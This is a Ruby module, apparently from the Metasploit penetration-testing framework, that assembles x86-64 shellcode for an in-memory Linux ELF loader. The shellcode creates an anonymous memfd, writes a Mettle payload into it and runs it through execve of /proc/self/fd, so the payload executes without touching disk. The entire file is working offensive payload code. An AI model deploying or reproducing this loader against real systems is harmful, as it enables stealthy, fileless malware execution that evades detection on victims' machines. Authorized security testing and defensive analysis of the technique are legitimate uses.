#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Diego Ledda <diego_ledda[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
module Msf::Payload::Linux::X64::ElfLoader
  def in_memory_load(payload)
    in_memory_loader_asm = %^
 start:
      xor rsi, rsi
      push rsi
      lea rdi, [rsp]
      inc rsi
      mov rax, 0x13F
      syscall                           ; memfd_create("", MFD_CLOEXEC);
      mov rdi, rax
      jmp get_payload
    got_payload:
      pop rsi
      mov rdx, #{payload.length}
      xor rax, rax
      inc rax
      syscall                            ; write(fd, elfbuffer, elfbuffer_len);
      jmp get_command
    got_command:
      pop rbx
      mov rcx, 18
      mov rax, rdi
    itoa:
      test rax, rax
      jz execve
      mov rdx, 10
      div dl
      mov rdx, rax
      shr rdx, 8
      and rax, 255
      add rdx, 48
      mov byte [rbx + rcx], dl
      dec rcx
      jmp itoa
    execve:
      mov rdi, rbx
      xor rdx, rdx
      xor rsi, rsi
      mov eax, 0x3b
      syscall                           ; execve("/proc/self/fd/<fd>", NULL, NULL);
    get_command:
      call got_command
      db "/proc/self/fd//////", 0x00
    get_payload:
      call got_payload
    ^
    in_memory_loader = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
    in_memory_loader
  end
end
